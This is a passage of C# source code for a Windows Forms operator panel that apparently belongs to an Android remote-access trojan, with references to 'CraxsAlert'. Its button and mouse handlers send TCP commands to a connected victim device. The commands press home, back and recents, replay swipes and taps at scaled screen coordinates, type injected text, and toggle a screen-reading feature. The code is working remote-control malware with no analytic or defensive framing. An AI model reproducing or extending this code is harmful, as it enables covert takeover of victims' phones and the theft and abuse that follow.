                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
    {
    }

    private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
    {
    }

    private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
    {
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
        ScreenShotFoucs = false;
        if (e.Button == MouseButtons.Left)
        {
            Trakpoint = new List<Point>();
            Trakpoint.Add(new Point(e.X, e.Y));
            isclick = false;
            isdown = true;
        }
        else
        {
            presstimer.Enabled = true;
            isclick = true;
        }
    }

    private void Viewpic_MouseMove(object sender, MouseEventArgs e)
    {
        if (isdown)
        {
            Swaping = true;
            isclick = false;
            Trakpoint.Add(new Point(e.X, e.Y));
        }
    }

    private void Viewpic_MouseUp(object sender, MouseEventArgs e)
    {
        isdown = false;
        int num = viewpic.Width;
        int num2 = viewpic.Height;
        checked
        {
            if (!isclick)
            {
                if (!Swaping)
                    return;
                Swaping = false;
                Trakpoint.Add(new Point(e.X, e.Y));
                StringBuilder stringBuilder = new StringBuilder();
                foreach (Point item in Trakpoint)
                {
                    stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
                }
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                return;
            }
            presstimer.Enabled = false;
            presstimer.Stop();
            string text = "clk:";
            if (tiks > 3)
                text = "clk:hold:";
            tiks = 0;
            Point point = viewpic.PointToClient(Control.MousePosition);
            Point point2 = new Point((int)Math.Round((double)point.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)point.Y * ((double)ScreenSize.Height / (double)num2)));
            text = text + point2.X + ":" + point2.Y;
            string[] array2 = classClient.Keys.Split(':');
            object[] parametersObjects2 = new object[4]
            {
                Client,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects2);
        }
    }



    private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
    {
        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            string[] array = classClient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            //	enablebtn.Enabled = true;
            //	disablebtn.Enabled = false;
        }
    }



    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
        if (classClient != null && textsend.Text.Length > 0)
        {
            object[] parametersObjects = new object[4]
            {
                classClient.myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            textsend.Text = "";
        }
    }

    private void DrakeUIAvatar1_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>En" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button7_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button6_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button5_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Enterbutton_Click(object sender, EventArgs e)
    {
        if (classClient != null && textsend.Text.Length > 0)
        {
            object[] parametersObjects = new object[4]
            {
                classClient.myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            textsend.Text = "";
        }
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            string[] array = classClient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            //	enablebtn.Enabled = false;
            //	disablebtn.Enabled = true;
        }
    }

}

